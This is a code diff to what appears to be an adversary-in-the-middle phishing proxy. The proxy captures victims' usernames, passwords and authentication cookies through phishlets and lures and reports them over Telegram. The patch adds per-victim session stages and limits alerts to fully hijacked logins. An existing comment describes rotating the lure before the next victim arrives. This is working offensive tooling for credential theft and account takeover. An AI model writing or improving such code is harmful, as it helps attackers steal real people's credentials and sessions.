@@ -1128,6 +1128,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						for _, au := range pl.authUrls {
 							if au.MatchString(req.URL.Path) {
 								s.Finish(true)
+								// This signal can fire before the password page is
+								// submitted (some auth_urls are subresources of the
+								// login page), so only call it authenticated when
+								// there is real evidence.
+								p.markAuthenticated(ps.SessionId, s.Password != "" || s.AllCookieAuthTokensCaptured(pl.cookieAuthTokens))
 								break
 							}
 						}
@@ -1357,6 +1362,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Error("database: %v", err)
 						}
 						s.Finish(false)
+						p.markAuthenticated(ps.SessionId, s.Password != "" || s.AllCookieAuthTokensCaptured(auth_tokens))
 						// Immediately rotate the autolure path so the captured URL
 						// is burned and replaced before the next victim arrives.
 						if s.PhishLure != nil && s.PhishLure.AutoRotate {
@@ -2231,7 +2237,47 @@ func (p *HttpProxy) setSessionUsername(sid string, username string) {
 	if ok {
 		s.SetUsername(username)
 		log.Debug("username added")
+		p.promoteStage(sid, database.StageEmail)
 	}
+}
+
+// promoteStage raises a session's stage (never lowers it) and persists it, so the
+// dashboard can tell an abandoned email entry apart from a completed login.
+// Reaching the authenticated stage additionally requires that the provider
+// confirmed the login (IsDone) and that a password was submitted, or that the
+// phishlet's own auth cookies were all captured (covers SSO/passwordless flows).
+func (p *HttpProxy) promoteStage(sid string, stage int) {
+	if sid == "" {
+		return
+	}
+	s, ok := p.sessions[sid]
+	if !ok {
+		return
+	}
+	next := s.Stage
+	if stage > next {
+		next = stage
+	}
+	// the provider already confirmed the login, and now we have credentials:
+	// that is a finished login even if the completion signal arrived first
+	if s.IsDone && next >= database.StageCredentials {
+		next = database.StageAuthenticated
+	}
+	if next == s.Stage {
+		return
+	}
+	s.Stage = next
+	if err := p.db.SetSessionStage(sid, next); err != nil {
+		log.Error("database: %v", err)
+	}
+}
+
+// markAuthenticated promotes to the final stage only when the login is evidenced.
+func (p *HttpProxy) markAuthenticated(sid string, evidenced bool) {
+	if !evidenced {
+		return
+	}
+	p.promoteStage(sid, database.StageAuthenticated)
 }
 
 func (p *HttpProxy) setSessionPassword(sid string, password string) {
@@ -2242,6 +2288,7 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 	if ok {
 		s.SetPassword(password)
 		log.Debug("password added")
+		p.promoteStage(sid, database.StageCredentials)
 	}
 }
 
@@ -2888,6 +2935,13 @@ func (p *HttpProxy) sendTelegramNotificationForSession(sid string) {
 
 	if !exists {
 		log.Warning("Telegram: session %s not found in memory", sid)
+		return
+	}
+
+	// Truthful reporting: stay quiet while the victim has only typed an email or
+	// the credentials. The call is repeated on later responses, so the completed
+	// login still gets reported once.
+	if s.Stage < database.StageAuthenticated {
 		return
 	}
 
